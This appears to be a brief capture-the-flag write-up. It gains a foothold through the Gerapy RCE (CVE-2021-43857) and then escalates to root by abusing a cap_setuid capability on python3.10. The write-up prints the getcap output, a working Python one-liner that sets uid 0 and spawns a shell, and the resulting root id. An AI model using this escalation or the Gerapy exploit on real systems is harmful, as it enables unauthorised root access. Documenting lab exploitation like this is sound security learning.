#### foot hold

port 8000: Gerapy has an RCE vulnerability (CVE-2021–43857).

check the source coed and found we shoud create a project to trigger this vuln.

get the shell of user app.

#### priv escalate
```
getcap -r / 2>/dev/null
/snap/core20/1518/usr/bin/ping cap_net_raw=ep
/snap/core20/1891/usr/bin/ping cap_net_raw=ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
/usr/bin/mtr-packet cap_net_raw=ep
/usr/bin/python3.10 cap_setuid=ep
/usr/bin/ping cap_net_raw=ep
```
`app@ubuntu:~$ python3 -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'`
```
# id
uid=0(root) gid=1000(app) groups=1000(app)
```

